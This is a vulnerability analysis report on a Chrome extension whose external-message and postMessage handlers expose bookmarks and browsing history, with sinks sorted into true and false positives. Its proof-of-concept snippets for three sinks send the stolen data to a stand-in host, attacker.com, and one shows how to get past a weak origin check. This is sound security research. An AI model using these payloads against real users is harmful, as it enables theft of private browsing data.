# CoCo Analysis: amlielhlgedcjnbkilihjhoheammcbgm

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 6 (grouped into 3 main vulnerability types)

---

## Sink 1: BookmarkTreeNode_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/amlielhlgedcjnbkilihjhoheammcbgm/opgen_generated_files/bg.js
Lines 845-871 - BookmarkTreeNode source (CoCo framework code)
Line 1334-1336 - searchBookmarks with sendResponse

**Code:**

```javascript
// bg.js - Lines 1323-1336: External message handler for bookmark search
chrome.runtime.onMessageExternal.addListener(async (request, sender, sendResponse) => {
    listener(request, sender, sendResponse);  // ← attacker-controlled request
    return true;
});

function listener(request, sender, sendResponse) {
    switch(request.event) {  // ← attacker controls event type
        case EVENTS.HEART:
            sendResponse(true);
            break;
        case EVENTS.SEARCH_BOOKMARKS:
            searchBookmarks(request.query).then(res => {  // ← attacker controls query
                sendResponse(res);  // ← sensitive bookmark data sent back to attacker
            });
            break;
        // ... other cases
    }
}

// Lines 1371-1377: Bookmark search function
function searchBookmarks(query) {
    return new Promise((resolve, reject) => {
        chrome.bookmarks.search(query, (res) => {  // ← searches bookmarks
            resolve(res);  // ← returns BookmarkTreeNode objects
        });
    });
}
```

**manifest.json:**
```json
"externally_connectable": {
    "matches": ["*://bestfreemaps.com/*"]
},
"permissions": [
    "bookmarks",
    "history",
    // ...
]
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domain

**Attack:**

```javascript
// From https://bestfreemaps.com/* page:
chrome.runtime.sendMessage(
    'amlielhlgedcjnbkilihjhoheammcbgm',  // extension ID
    {
        event: 'SEARCH_BOOKMARKS',
        query: ''  // empty query returns ALL bookmarks
    },
    function(bookmarks) {
        // Attacker receives all user bookmarks
        console.log('Stolen bookmarks:', bookmarks);
        // Exfiltrate to attacker server
        fetch('https://attacker.com/collect', {
            method: 'POST',
            body: JSON.stringify(bookmarks)
        });
    }
);
```

**Impact:** Complete exfiltration of user's browser bookmarks. The attacker can retrieve all bookmark URLs, titles, folder structure, and metadata by sending an empty query string or specific search terms. This violates user privacy and exposes their browsing habits and frequently visited sites.

---

## Sink 2: HistoryItem_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/amlielhlgedcjnbkilihjhoheammcbgm/opgen_generated_files/bg.js
Lines 775-783 - HistoryItem source (CoCo framework code)
Lines 1338-1341 - searchHistory with sendResponse

**Code:**

```javascript
// bg.js - Lines 1338-1341: History search handler
function listener(request, sender, sendResponse) {
    switch(request.event) {
        // ... bookmark case above
        case EVENTS.SEARCH_HISTORY:
            searchHistory(request.query).then(res => {  // ← attacker controls query
                sendResponse(res);  // ← sensitive history data sent back to attacker
            });
            break;
        // ... other cases
    }
}

// Lines 1379-1385: History search function
function searchHistory(query) {
    return new Promise((resolve, reject) => {
        chrome.history.search({ text: query, maxResults: 10 }, (res) => {  // ← searches history
            resolve(res);  // ← returns HistoryItem objects with URLs, titles, visit counts
        });
    });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domain

**Attack:**

```javascript
// From https://bestfreemaps.com/* page:
chrome.runtime.sendMessage(
    'amlielhlgedcjnbkilihjhoheammcbgm',
    {
        event: 'SEARCH_HISTORY',
        query: ''  // empty or specific search term
    },
    function(history) {
        // Attacker receives user's browsing history
        console.log('Stolen history:', history);
        // Exfiltrate to attacker server
        fetch('https://attacker.com/collect', {
            method: 'POST',
            body: JSON.stringify(history)
        });
    }
);
```

**Impact:** Exfiltration of user's browsing history including URLs, page titles, last visit times, typed counts, and visit counts. This is a severe privacy violation exposing sensitive user browsing behavior.

---

## Sink 3: bg_chrome_runtime_MessageExternal → bg_localStorage_setItem_value_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/amlielhlgedcjnbkilihjhoheammcbgm/opgen_generated_files/bg.js
Lines 1362-1363 - localStorage.setItem with request.account

**Code:**

```javascript
// bg.js - Lines 1361-1367: User status storage
function listener(request, sender, sendResponse) {
    switch(request.event) {
        // ... bookmark and history cases above
        case EVENTS.SET_USER_STATUS:
            if (request.status && request.account) {  // ← attacker-controlled
                localStorage.setItem('account', JSON.stringify(request.account));  // ← storage poisoning
            } else {
                localStorage.removeItem('account');
            }
            break;
    }
}
```

**Classification:** FALSE POSITIVE (for this specific sink)

**Reason:** Incomplete storage exploitation. This is storage poisoning only (`storage.set` without a retrieval path back to the attacker). The methodology states: "Storage poisoning alone (storage.set without retrieval) is NOT exploitable." While the attacker can poison the localStorage with arbitrary account data, there is no evidence in the flagged code that this data flows back to the attacker or is used in a subsequent vulnerable operation (like executeScript, fetch to attacker URL, etc.). The stored account data would need to be retrieved and sent back to the attacker to be a TRUE POSITIVE.

---

## Sink 4: cs_window_eventListener_message → BookmarkSearchQuery_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/amlielhlgedcjnbkilihjhoheammcbgm/opgen_generated_files/cs_0.js
Lines 467-477 - window.addEventListener('message') forwarding to chrome.runtime.sendMessage
Lines 1334 - searchBookmarks with request.query

**Code:**

```javascript
// cs_0.js (content_script.js) - Lines 467-493: PostMessage bridge
window.addEventListener('message', function (e) {
    if (!e.data.from || e.data.from != '__bestfreemaps') {  // ← weak check, attacker can bypass
        return false;
    }

    if (localStorage.getItem('__debug')) {
        console.log('Content script receiving: ');
        console.log(e);
    }

    chrome.runtime.sendMessage(e.data, (res) => {  // ← forwards attacker data to background
        if (chrome.runtime.lastError) {

        }

        const sender = {
            event: e.data.event,
            res: res  // ← returns response including bookmarks/history
        };
        sendMessage(sender);  // ← posts message back to webpage

        if (localStorage.getItem('__debug')) {
            console.log('Content script sending: ');
            console.log(sender);
        }
    });
});

// bg.js - Background handles the forwarded message (same as Sink 1)
function listener(request, sender, sendResponse) {
    switch(request.event) {
        case EVENTS.SEARCH_BOOKMARKS:
            searchBookmarks(request.query).then(res => {  // ← attacker controls query
                sendResponse(res);  // ← bookmarks sent back via content script to webpage
            });
            break;
    }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from webpage to content script

**Attack:**

```javascript
// From ANY webpage (content script runs on <all_urls>):
window.postMessage({
    from: '__bestfreemaps',  // ← bypass the weak check
    event: 'SEARCH_BOOKMARKS',
    query: ''  // get all bookmarks
}, '*');

// Listen for response
window.addEventListener('message', function(e) {
    if (e.data.res) {
        console.log('Stolen bookmarks:', e.data.res);
        // Exfiltrate
        fetch('https://attacker.com/collect', {
            method: 'POST',
            body: JSON.stringify(e.data.res)
        });
    }
});
```

**Impact:** ANY malicious webpage can steal user bookmarks by posting a message with `from: '__bestfreemaps'`. The content script runs on `<all_urls>` (manifest line 39-41), so this vulnerability is exploitable from any website, not just the whitelisted domain. This is more severe than the external message vulnerability because it doesn't require the attacker to control the whitelisted domain.

---

## Sink 5: cs_window_eventListener_message → bg_localStorage_setItem_value_sink

**CoCo Trace:**
Same as Sink 4, but ends at localStorage.setItem instead of bookmark search

**Classification:** FALSE POSITIVE

**Reason:** Same as Sink 3 - incomplete storage exploitation. Storage poisoning without retrieval path back to attacker.
